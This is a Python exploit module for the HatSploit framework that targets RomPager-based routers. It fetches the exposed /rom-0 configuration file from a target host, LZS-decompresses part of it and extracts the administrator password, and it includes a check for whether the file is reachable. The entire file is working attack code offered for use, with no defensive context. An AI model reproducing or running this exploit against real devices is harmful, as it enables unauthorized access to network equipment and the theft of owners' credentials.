#!/usr/bin/env python3

#
# This module requires HatSploit: https://hatsploit.com
# Current source: https://github.com/EntySec/HatSploit
#

import re

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient
from pex.string import String


class HatSploitModule(Module, HTTPClient, String):
    details = {
        'Category': "exploit",
        'Name': "RomPager Multi Password Disclosure",
        'Module': "exploit/linux/rompager/multi_password_disclosure",
        'Authors': ['Ivan Nikolsky (enty8080) - module developer'],
        'Description': "RomPager multiple devices password disclosure.",
        'Platform': "linux",
        'Rank': "high",
    }

    options = {
        'HOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True,
        },
        'PORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True,
        },
        'USERNAME': {
            'Description': "Default username.",
            'Value': "admin",
            'Type': None,
            'Required': True,
        },
    }

    def exploit(self, remote_host, remote_port, username):
        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/rom-0'
        )

        result = self.lzs_decompress(response.content[8568:])
        password = re.findall("([\040-\176]{5,})", result)

        if password:
            self.print_table(
                "Credentials", ('Username', 'Password'), (username, password[0])
            )
        else:
            self.print_warning(
                f"Target vulnerable, but default username is not {username}."
            )

    def check(self):
        remote_host, remote_port, _ = self.parse_options(self.options)

        response = self.http_request(
            method="GET", host=remote_host, port=remote_port, path='/rom-0'
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port, username = self.parse_options(self.options)

        self.exploit(remote_host, remote_port, username)
